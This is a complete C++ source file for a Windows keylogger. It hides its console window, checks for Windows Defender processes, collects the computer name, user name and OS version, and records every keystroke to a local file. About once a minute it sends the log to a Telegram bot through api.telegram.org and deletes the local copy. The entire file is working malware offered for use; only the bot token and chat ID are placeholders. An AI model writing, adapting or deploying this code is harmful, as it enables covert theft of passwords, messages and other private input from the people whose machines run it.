#include <iostream>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <wininet.h>
#include <ctime>
#include <sstream>
#include <iomanip>
#include <chrono>
#include <cwctype>
#include <locale>
#include <codecvt>

#pragma comment(lib, "wininet.lib")

// Forward declarations
bool IsWindowsDefenderRunning();
std::string GetCurrentTimestamp();
bool SendToTelegram(const std::string& message);
std::string GetSpecialKeyName(int key);
void LogKeystrokes();
std::string GetTargetSystemInfo();

// Function to convert narrow string to wide string
std::wstring StringToWide(const std::string& str) {
    std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
    return converter.from_bytes(str);
}

// Function to check if Windows Defender is running
bool IsWindowsDefenderRunning() {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return false;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            // Convert process name to wide string for comparison
            std::wstring processName = StringToWide(pe.szExeFile);
            
            if (_wcsicmp(processName.c_str(), L"MsMpEng.exe") == 0 || 
                _wcsicmp(processName.c_str(), L"NisSrv.exe") == 0 ||
                _wcsicmp(processName.c_str(), L"SecurityHealthService.exe") == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return false;
}

// Function to get current timestamp
std::string GetCurrentTimestamp() {
    auto now = std::chrono::system_clock::now();
    auto in_time_t = std::chrono::system_clock::to_time_t(now);

    std::stringstream ss;
    ss << std::put_time(std::localtime(&in_time_t), "%Y-%m-%d %X");
    return ss.str();
}

// Function to send data to Telegram bot
bool SendToTelegram(const std::string& message) {
    HINTERNET hInternet = InternetOpenW(L"Keylogger", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnectW(hInternet, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 1);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    std::wstring url = L"/botYOUR_TELEGRAM_BOT_TOKEN/sendMessage?chat_id=YOUR_CHAT_ID&text=";
    // Simple URL encoding
    for (char c : message) {
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            url += c;
        } else if (c == ' ') {
            url += L'+';
        } else {
            wchar_t buf[4];
            swprintf(buf, 4, L"%%%02X", (unsigned char)c);
            url += buf;
        }
    }

    HINTERNET hRequest = HttpOpenRequestW(hConnect, L"GET", url.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE | INTERNET_FLAG_RELOAD, 1);
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return false;
    }

    BOOL bRequestSent = HttpSendRequestW(hRequest, NULL, 0, NULL, 0);
    DWORD statusCode = 0;
    DWORD statusCodeSize = sizeof(statusCode);
    
    if (bRequestSent) {
        HttpQueryInfoW(hRequest, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, 
                      &statusCode, &statusCodeSize, NULL);
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    return (statusCode >= 200 && statusCode < 300);
}

// Function to get special key name
std::string GetSpecialKeyName(int key) {
    switch (key) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_RETURN: return "[ENTER]\n";
        case VK_SPACE: return " ";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPSLOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_PRIOR: return "[PAGEUP]";
        case VK_NEXT: return "[PAGEDOWN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        case VK_INSERT: return "[INSERT]";
        case VK_DELETE: return "[DELETE]";
        case VK_LWIN: return "[LWIN]";
        case VK_RWIN: return "[RWIN]";
        case VK_NUMPAD0: return "0";
        case VK_NUMPAD1: return "1";
        case VK_NUMPAD2: return "2";
        case VK_NUMPAD3: return "3";
        case VK_NUMPAD4: return "4";
        case VK_NUMPAD5: return "5";
        case VK_NUMPAD6: return "6";
        case VK_NUMPAD7: return "7";
        case VK_NUMPAD8: return "8";
        case VK_NUMPAD9: return "9";
        case VK_MULTIPLY: return "*";
        case VK_ADD: return "+";
        case VK_SUBTRACT: return "-";
        case VK_DECIMAL: return ".";
        case VK_DIVIDE: return "/";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        case VK_NUMLOCK: return "[NUMLOCK]";
        case VK_SCROLL: return "[SCROLLLOCK]";
        case VK_SNAPSHOT: return "[PRINTSCREEN]";
        case VK_OEM_1: return (GetKeyState(VK_SHIFT) & 0x8000) ? ":" : ";";
        case VK_OEM_PLUS: return (GetKeyState(VK_SHIFT) & 0x8000) ? "+" : "=";
        case VK_OEM_COMMA: return (GetKeyState(VK_SHIFT) & 0x8000) ? "<" : ",";
        case VK_OEM_MINUS: return (GetKeyState(VK_SHIFT) & 0x8000) ? "_" : "-";
        case VK_OEM_PERIOD: return (GetKeyState(VK_SHIFT) & 0x8000) ? ">" : ".";
        case VK_OEM_2: return (GetKeyState(VK_SHIFT) & 0x8000) ? "?" : "/";
        case VK_OEM_3: return (GetKeyState(VK_SHIFT) & 0x8000) ? "~" : "`";
        case VK_OEM_4: return (GetKeyState(VK_SHIFT) & 0x8000) ? "{" : "[";
        case VK_OEM_5: return (GetKeyState(VK_SHIFT) & 0x8000) ? "|" : "\\";
        case VK_OEM_6: return (GetKeyState(VK_SHIFT) & 0x8000) ? "}" : "]";
        case VK_OEM_7: return (GetKeyState(VK_SHIFT) & 0x8000) ? "\"" : "'";
        default: return "";
    }
}

// Function to log keystrokes
void LogKeystrokes() {
    std::ofstream logFile("keylog.txt", std::ios_base::app);
    if (!logFile.is_open()) {
        return;
    }

    logFile << "\n\n[Session started: " << GetCurrentTimestamp() << "]\n";

    int count = 0;
    const int sendInterval = 600; // 600 * 100ms = 60 seconds

    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 0x0001) { // Check for key press (not just key down)
                std::string keyStr = GetSpecialKeyName(key);
                
                if (!keyStr.empty()) {
                    logFile << keyStr;
                } else if (isalpha(key)) {
                    bool isUpperCase = (GetKeyState(VK_CAPITAL) & 0x0001) ^ (GetKeyState(VK_SHIFT) & 0x8000);
                    logFile << (isUpperCase ? (char)key : (char)tolower(key));
                } else if (isdigit(key) && !(GetKeyState(VK_SHIFT) & 0x8000)) {
                    logFile << (char)key;
                }
                
                logFile.flush();
            }
        }

        Sleep(100); // Reduce CPU usage

        if (++count >= sendInterval) {
            logFile << "\n[Session ended: " << GetCurrentTimestamp() << "]\n";
            logFile.close();

            std::ifstream inFile("keylog.txt");
            if (inFile) {
                std::string content((std::istreambuf_iterator<char>(inFile)), 
                                    std::istreambuf_iterator<char>());
                if (!content.empty()) {
                    SendToTelegram(content);
                }
                inFile.close();
            }

            remove("keylog.txt");
            logFile.open("keylog.txt", std::ios_base::app);
            logFile << "[Session started: " << GetCurrentTimestamp() << "]\n";
            count = 0;
        }
    }
}

// Function to get system information (renamed to avoid conflict with Windows API)
std::string GetTargetSystemInfo() {
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    GetComputerNameA(computerName, &size);

    char userName[256];
    DWORD userNameSize = sizeof(userName);
    GetUserNameA(userName, &userNameSize);

    // Get Windows version info
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((OSVERSIONINFO*)&osvi);

    std::stringstream ss;
    ss << "System Information:\n";
    ss << "Computer Name: " << computerName << "\n";
    ss << "Username: " << userName << "\n";
    ss << "OS Version: " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion << "\n";
    ss << "Process ID: " << GetCurrentProcessId() << "\n";
    ss << "Timestamp: " << GetCurrentTimestamp() << "\n";

    return ss.str();
}

int main() {
    // Hide console window
    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    // Check for Windows Defender
    if (IsWindowsDefenderRunning()) {
        std::ofstream logFile("keylog.txt", std::ios_base::app);
        logFile << "[Warning] Windows Defender is running\n";
        logFile.close();
    }

    // Send system information
    std::string systemInfo = GetTargetSystemInfo();
    SendToTelegram(systemInfo);

    // Start keylogger
    LogKeystrokes();

    return 0;
}
